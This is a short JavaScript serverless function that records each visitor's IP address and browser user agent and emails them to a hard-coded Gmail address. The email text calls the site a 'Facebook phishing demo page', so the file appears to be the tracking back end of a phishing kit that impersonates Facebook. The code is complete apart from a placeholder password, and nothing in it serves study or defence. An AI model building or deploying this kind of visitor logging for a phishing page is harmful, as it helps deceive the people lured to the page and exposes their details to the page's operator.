const nodemailer = require('nodemailer');

exports.handler = async function (event, context) {
  try {
    const ip = event.headers['client-ip'];
    const userAgent = event.headers['user-agent'];
    const details = `IP: ${ip}\nUser Agent: ${userAgent}`;

    let transporter = nodemailer.createTransport({
      service: 'gmail', // or your email service
      auth: {
        user: 'mwananchihuslerloans@gmail.com', // Your email address
        pass: 'YOUR_EMAIL_PASSWORD' // Your app password
      },
    });

    let info = await transporter.sendMail({
      from: 'mwananchihuslerloans@gmail.com',
      to: 'mwananchihuslerloans@gmail.com',
      subject: 'Website Visit Alert!',
      text: 'Someone visited your Facebook phishing demo page.\n\nVisitor Details:\n' + details,
    });

    console.log('Message sent: %s', info.messageId);

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Email sent successfully' }),
    };
  } catch (error) {
    console.error('Error sending email:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message }),
    };
  }
};
